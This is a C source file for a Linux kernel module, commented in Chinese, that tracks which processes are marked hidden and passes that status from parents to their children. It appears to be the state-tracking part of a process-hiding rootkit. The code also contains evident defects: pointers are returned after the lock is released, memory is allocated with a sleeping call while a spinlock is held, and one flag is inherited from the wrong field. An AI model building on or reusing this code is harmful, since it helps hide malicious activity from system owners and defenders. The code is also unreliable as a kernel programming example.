#include "core/proc_state.h"
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/hashtable.h>
#include <linux/spinlock.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include "core/lifecycle.h"


#define PROC_HASH_BITS 10

static DEFINE_HASHTABLE(proc_table, PROC_HASH_BITS);
static DEFINE_SPINLOCK(proc_lock);

/* ---------------- 内部查找 ---------------- */
static struct proc_state *proc_lookup(pid_t pid)
{
    struct proc_state *e;
    hash_for_each_possible(proc_table, e, node, pid) {
        if (e->pid == pid)
            return e;
    }
    return NULL;
}

/* ---------------- 外部安全访问 ---------------- */
struct proc_state *proc_state_get(pid_t pid)
{
    struct proc_state *ps;
    spin_lock(&proc_lock);
    ps = proc_lookup(pid);
    spin_unlock(&proc_lock);
    return ps;
}

/* ---------------- 初始化/清理 ---------------- */
int proc_state_init(void)
{
    hash_init(proc_table);
    return 0;
}

void proc_state_cleanup(void)
{
    struct proc_state *e;
    struct hlist_node *tmp;
    int b;

    spin_lock(&proc_lock);
    hash_for_each_safe(proc_table, b, tmp, e, node) {
        hash_del(&e->node);
        kfree(e);
    }
    spin_unlock(&proc_lock);
}

/* ---------------- 设置 ---------------- */
bool proc_state_set(pid_t pid, pid_t ppid, u32 flags,
                    bool ancestor_hidden, bool is_ancestor_root)
{
    struct proc_state *e;

    spin_lock(&proc_lock);
    e = proc_lookup(pid);
    if (!e) {
        e = kzalloc(sizeof(*e), GFP_KERNEL);
        if (!e) {
            // pr_err("[HIDE][ERROR] failed to allocate proc_state for pid=%d\n", pid);
            spin_unlock(&proc_lock);
            return false;
        }
        e->pid = pid;
        e->ppid = ppid;
        hash_add(proc_table, &e->node, pid);
        // pr_info("[HIDE][DEBUG] created proc_state for pid=%d ppid=%d\n", pid, ppid);
    }

    e->flags |= flags;
    e->ancestor_hidden = ancestor_hidden;
    e->is_ancestor_root = is_ancestor_root;
    spin_unlock(&proc_lock);

    return (flags & (PROC_HIDDEN_SELF | PROC_HIDDEN_INHERITED)) || ancestor_hidden;
}

/* ---------------- 清理 ---------------- */
void proc_state_clear(pid_t pid)
{
    struct proc_state *e;
    spin_lock(&proc_lock);
    e = proc_lookup(pid);
    if (e) {
        hash_del(&e->node);
        kfree(e);
    }
    spin_unlock(&proc_lock);
}

/* ---------------- 查询 ---------------- */
bool proc_is_hidden(pid_t pid)
{
    struct proc_state *e;
    bool hidden = false;
    spin_lock(&proc_lock);
    e = proc_lookup(pid);
    if (e && (e->flags & (PROC_HIDDEN_SELF | PROC_HIDDEN_INHERITED)))
        hidden = true;
    spin_unlock(&proc_lock);
    return hidden;
}

bool proc_state_any_ancestor_hidden(pid_t pid)
{
    struct proc_state *e;
    bool result = false;
    spin_lock(&proc_lock);
    e = proc_lookup(pid);
    if (e)
        result = e->ancestor_hidden;
    spin_unlock(&proc_lock);
    return result;
}

/* ---------------- 查找链上祖宗是否隐藏 ---------------- */
bool resolve_ancestor_hidden(pid_t ppid)
{
    struct proc_state *ps;

    while (ppid > 0) {
        ps = proc_state_get(ppid);

        // 找到已经标记隐藏的祖宗
        if (ps && (ps->flags & (PROC_HIDDEN_SELF | PROC_HIDDEN_INHERITED))) {
            // pr_info("[HIDE][DEBUG] resolve_ancestor_hidden: pid=%d is hidden\n", ppid);
            return true;
        }

        // 如果没有 proc_state，则尝试从 task_struct 创建临时条目
        if (!ps) {
            struct task_struct *task = pid_task(find_vpid(ppid), PIDTYPE_PID);
            if (!task)
                break; // 无法找到父进程，链断

            // 创建临时 proc_state
            proc_state_set(ppid,
                           task->real_parent ? task->real_parent->pid : 0,
                           0, false, false);
            ps = proc_state_get(ppid);
        }

        // 沿链向上
        ppid = ps ? ps->ppid : 0;
    }

    return false;
}

/* ---------------- 继承逻辑 ---------------- */
// 子进程继承父进程隐藏状态
void proc_state_inherit(pid_t parent, pid_t child)
{
    struct proc_state *ps_parent = proc_state_get(parent);
    bool ancestor_hidden = false;
    bool is_ancestor_root = false;

    if (ps_parent) {
        // 继承父进程是否为祖宗根节点
        ancestor_hidden = ps_parent->is_ancestor_root;
        is_ancestor_root = ps_parent->is_ancestor_root;
    }

    u32 flags = ancestor_hidden ? PROC_HIDDEN_INHERITED : 0;

    proc_state_set(child, parent, flags, ancestor_hidden, is_ancestor_root);

    if (ancestor_hidden)
        add_hidden_pid(child);

    /* pr_info("[HIDE][DEBUG] inherit: parent=%d child=%d ancestor_hidden=%d is_root=%d\n",
            parent, child, ancestor_hidden, is_ancestor_root);*/
}



